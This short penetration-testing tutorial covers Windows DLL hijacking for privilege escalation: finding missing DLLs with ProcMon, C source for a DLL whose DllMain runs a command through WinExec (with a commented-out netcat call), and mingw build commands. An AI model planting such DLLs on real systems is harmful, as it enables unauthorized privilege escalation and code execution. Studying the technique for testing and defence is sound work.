# DLL Hijacking
If a privileged application includes a missing DLL, we can replace that DLL and execute arbitrary privileged commands.
## ProcMon
[ProcMon](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/tree/master/Privilege%20Escalation/windows-binaries) is a Microsoft SysInternals stand-alone binary which can be used to search for such a scenario. When ran look for any `QueryOpen` operations that result in `NAME_NOT_FOUND` Then simply replace the DLL with a malicious DLL which spawns a shell.
## Malicious DLL
Below is the C code which we canm use to create a "malicious" Windows DLL file.
```
#include <windows.h>
int fireLazor()
{
 //WinExec("nc", 0);
 WinExec("cmd \"d:some path\\program.bat\" \"d:\\other path\\file name.ext\"",SW_SHOW_MINIMIZED);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 fireLazor();
 return 0;
}
```
Compil;e the code as follows,
```
i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
```
This will create a file called `main.dll`.
